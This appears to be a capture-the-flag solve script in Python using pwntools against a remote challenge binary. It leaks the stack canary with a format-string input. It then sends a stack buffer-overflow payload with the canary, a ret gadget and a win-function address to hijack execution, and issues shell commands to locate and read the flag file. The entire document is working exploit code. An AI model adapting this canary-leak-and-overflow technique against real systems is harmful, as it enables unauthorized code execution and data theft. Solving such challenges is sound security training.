#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      Canary found  =>  we should bypass the stack canary to exploit the buffer overflow vulnerability
# PIE:        NO PIE enabled  =>  addresses are static and can be used directly in the exploit

exe = context.binary = ELF("./secret_library", checksec=False)

CANARY_IDX = 23   # the canary is found at index 23 (easily observable since it has the LSB = 00)
OFFSET_TO_CANARY = 128 + 8   # 128 bytes for the buffer + 8 bytes for alignment
OFFSET_TO_RIP = OFFSET_TO_CANARY + 8 + 8    # 8 bytes for the canary and 8 bytes for the saved RBP
win_addr = 0x401262
ret_gadget = 0x40101a

p = remote("offsec.m0lecon.it", 13543)

p.recvuntil(b"Sign the guestbook: ")

p.sendline(f"%{CANARY_IDX}$lx".encode())
leak = p.recvline().strip()
canary = int(leak.split(b",")[1], 16)
log.info(f"canary = {canary:#x}")

p.recvuntil(b"\nLeave a review: ")
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # 8 bytes for the saved RBP
    p64(ret_gadget),    # ret gadget for alignment
    p64(win_addr),
)

p.send(payload)

p.sendline(b"find / -name flag")    # find the path of the flag file (to be used in the next command)
p.sendline(b"cat /home/user/flag")  # insert here the path of the flag file

p.interactive()
